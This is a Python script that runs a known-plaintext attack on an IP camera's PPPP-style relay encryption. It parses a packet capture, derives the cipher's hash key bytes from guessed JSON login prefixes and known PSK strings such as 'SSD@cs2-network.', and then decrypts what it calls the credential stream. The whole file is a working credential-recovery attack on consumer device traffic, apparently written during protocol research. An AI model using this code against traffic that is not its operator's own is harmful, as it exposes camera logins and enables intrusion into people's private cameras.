#!/usr/bin/env python3
"""
Crack the relay session encryption key using KPA on known JSON prefix.
The encryption is position-dependent PPPP-style: each byte's key = shuffle_table[(hash[prev&3] + prev) % 256]
From known plaintext, we can derive all 4 psk_hash values.
Then decrypt the entire credential stream.
"""
from scapy.all import rdpcap
import struct

shuffle_table = [
    0x7C,0x9C,0xE8,0x4A,0x13,0xDE,0xDC,0xB2,0x2F,0x21,0x23,0xE4,0x30,0x7B,0x3D,0x8C,
    0xBC,0x0B,0x27,0x0C,0x3C,0xF7,0x9A,0xE7,0x08,0x71,0x96,0x00,0x97,0x85,0xEF,0xC1,
    0x1F,0xC4,0xDB,0xA1,0xC2,0xEB,0xD9,0x01,0xFA,0xBA,0x3B,0x05,0xB8,0x15,0x87,0x83,
    0x28,0x72,0xD1,0x8B,0x5A,0xD6,0xDA,0x93,0x58,0xFE,0xAA,0xCC,0x6E,0x1B,0xF0,0xA3,
    0x88,0xAB,0x43,0xC0,0x0D,0xB5,0x45,0x38,0x4F,0x50,0x22,0x66,0x20,0x7F,0x07,0x5B,
    0x14,0x98,0x1D,0x9B,0xA7,0x2A,0xB9,0xA8,0xCB,0xF1,0xFC,0x49,0x47,0x06,0x3E,0xB1,
    0x0E,0x04,0x3A,0x94,0x5E,0xEE,0x54,0x11,0x34,0xDD,0x4D,0xF9,0xEC,0xC7,0xC9,0xE3,
    0x78,0x1A,0x6F,0x70,0x6B,0xA4,0xBD,0xA9,0x5D,0xD5,0xF8,0xE5,0xBB,0x26,0xAF,0x42,
    0x37,0xD8,0xE1,0x02,0x0A,0xAE,0x5F,0x1C,0xC5,0x73,0x09,0x4E,0x69,0x24,0x90,0x6D,
    0x12,0xB3,0x19,0xAD,0x74,0x8A,0x29,0x40,0xF5,0x2D,0xBE,0xA5,0x59,0xE0,0xF4,0x79,
    0xD2,0x4B,0xCE,0x89,0x82,0x48,0x84,0x25,0xC6,0x91,0x2B,0xA2,0xFB,0x8F,0xE9,0xA6,
    0xB0,0x9E,0x3F,0x65,0xF6,0x03,0x31,0x2E,0xAC,0x0F,0x95,0x2C,0x5C,0xED,0x39,0xB7,
    0x33,0x6C,0x56,0x7E,0xB4,0xA0,0xFD,0x7A,0x81,0x53,0x51,0x86,0x8D,0x9F,0x77,0xFF,
    0x6A,0x80,0xDF,0xE2,0xBF,0x10,0xD7,0x75,0x64,0x57,0x76,0xF3,0x55,0xCD,0xD0,0xC8,
    0x18,0xE6,0x36,0x41,0x62,0xCF,0x99,0xF2,0x32,0x4C,0x67,0x60,0x61,0x92,0xCA,0xD3,
    0xEA,0x63,0x7D,0x16,0xB6,0x8E,0xD4,0x68,0x35,0xC3,0x52,0x9D,0x46,0x44,0x1E,0x17,
]

# Build inverse lookup: value -> index
shuffle_inverse = [0] * 256
for i, v in enumerate(shuffle_table):
    shuffle_inverse[v] = i

def create_psk_hash(psk):
    h = [0, 0, 0, 0]
    for b in psk.encode():
        h[0] = (h[0] + b) & 0xFF
        h[1] = (h[1] - b) & 0xFF
        h[2] = (h[2] + b // 3) & 0xFF
        h[3] = (h[3] ^ b) & 0xFF
    return h

def pppp_decrypt_with_hash(psk_hash, data):
    result = []
    prev = 0
    for b in data:
        idx = (psk_hash[prev & 3] + prev) & 0xFF
        key = shuffle_table[idx]
        dec = b ^ key
        result.append(dec)
        prev = b
    return bytes(result)

def derive_hash_from_plaintext(enc_data, known_pt, hash_guess=None):
    """
    Derive psk_hash values from known plaintext.
    For each position i:
      key = enc[i] XOR pt[i]
      key_idx = shuffle_inverse[key]
      psk_hash[prev_enc & 3] = (key_idx - prev_enc) % 256
    """
    h = [None, None, None, None] if hash_guess is None else list(hash_guess)
    prev = 0
    
    for i, (eb, pb) in enumerate(zip(enc_data, known_pt)):
        key = eb ^ pb
        key_idx = shuffle_inverse[key]
        
        slot = prev & 3
        derived = (key_idx - prev) & 0xFF
        
        if h[slot] is None:
            h[slot] = derived
        elif h[slot] != derived:
            print(f"  WARNING: byte {i} hash[{slot}] conflict: was {h[slot]}, derived {derived}")
            # This means our known plaintext is wrong at this position
        
        prev = eb
    
    return h

# Extract credential packets
pkts = rdpcap("startup.pcap")
cred_pkts = []

for i, pkt in enumerate(pkts):
    if not hasattr(pkt, "load"):
        continue
    data = bytes(pkt.load)
    if len(data) < 20:
        continue
    if data[0] == 0x00 and len(data) > 30 and data[8:10] != b'\x00\x00':
        enc_data = data[15:]
        ctr = struct.unpack(">H", data[6:8])[0]
        rem_len = struct.unpack(">H", data[8:10])[0]
        cred_pkts.append((ctr, rem_len, enc_data))

print(f"Found {len(cred_pkts)} credential fragments")

# Known JSON prefixes the app might send
known_prefixes = [
    b'{"connectType":"relay","protocol":"shix","user":"admin","password":"1234"}',
    b'{"connectType":2,"user":"admin","pwd":"1234"}',
    b'{"connectType":2,"user":"admin","password":"1234"}',
    b'{"connectType":"relay"}',
    b'{"connectType":2}',
    b'{"type":"connect","user":"admin","pwd":"1234"}',
    b'{"type":"login","user":"admin","pwd":"1234"}',
    b'{"cmd":"connect","usr":"admin","pwd":"1234"}',
]

print("\n=== Attempting hash derivation from known prefixes ===")

# Get the first fragment
if cred_pkts:
    ctr, rem_len, enc = cred_pkts[0]
    print(f"\nFirst fragment: ctr={ctr} rem_len={rem_len} enc_len={len(enc)}")
    print(f"Encrypted: {enc[:40].hex()}")
    
    for prefix in known_prefixes:
        if len(prefix) > len(enc):
            continue
        
        h = derive_hash_from_plaintext(enc[:len(prefix)], prefix)
        none_count = sum(1 for v in h if v is None)
        print(f"\nPrefix ({len(prefix)}B): {prefix[:60]}...")
        print(f"  Derived hash: {h} (unknown: {none_count})")
        
        if none_count <= 1:
            # Fill missing with 0
            h_filled = [v if v is not None else 0 for v in h]
            
            # Try decrypting all fragments
            all_dec = b""
            for ct, rl, ed in cred_pkts[:8]:
                dec = pppp_decrypt_with_hash(h_filled, ed)
                all_dec += dec
            
            try:
                text = all_dec.decode("ascii", errors="replace")
                if '{' in text[:20]:
                    print(f"  >>> DECRYPTED: {text[:200]}")
            except:
                pass

# Alternative: derive hash from response too
print("\n\n=== Looking at DOWNLINK responses ===")
for i, pkt in enumerate(pkts):
    if not hasattr(pkt, "load"):
        continue
    data = bytes(pkt.load)
    if data[0] == 0x0d and 20 < len(data) < 100:
        if data[3] == 0x00:  # flag=0 (response)
            enc_start = 15
            if len(data) > enc_start:
                enc = data[enc_start:]
                ctr = struct.unpack(">H", data[6:8])[0]
                print(f"\nPkt {i}: DL ctr={ctr} len={len(enc)}")
                print(f"  enc: {enc[:40].hex()}")
                
                # Try decrypting with derived hashes
                for psk in ["camera", "SHIX", "SSD@cs2-network.", "admin"]:
                    ph = create_psk_hash(psk)
                    dec = pppp_decrypt_with_hash(ph, enc)
                    try:
                        text = dec.decode("ascii", errors="replace")
                        if '{' in text[:5]:
                            print(f"  >>> [{psk}] {text[:150]}")
                    except:
                        pass

# Actually, let me try a smarter approach.
# The relay session PSK might be derived from the discovery token.
# Or it might use the server PSK "SSD@cs2-network."
# Or it might be none of these.

print("\n\n=== Testing known PSK hashes on all fragments ===")
for psk in ["camera", "SHIX", "SSD@cs2-network.", "DGOG", "admin", "1234"]:
    ph = create_psk_hash(psk)
    print(f"\nPSK=[{psk}] hash={ph}")
    
    all_dec = b""
    for ct, rl, ed in cred_pkts[:8]:
        dec = pppp_decrypt_with_hash(ph, ed)
        all_dec += dec
    
    printable = sum(1 for b in all_dec if 32 <= b < 127)
    print(f"  Total: {len(all_dec)}B, printable: {printable} ({100*printable/len(all_dec):.1f}%)")
    if printable > len(all_dec) * 0.3:
        try:
            text = all_dec.decode("ascii", errors="replace")
            print(f"  TEXT: {text[:200]}")
        except:
            pass
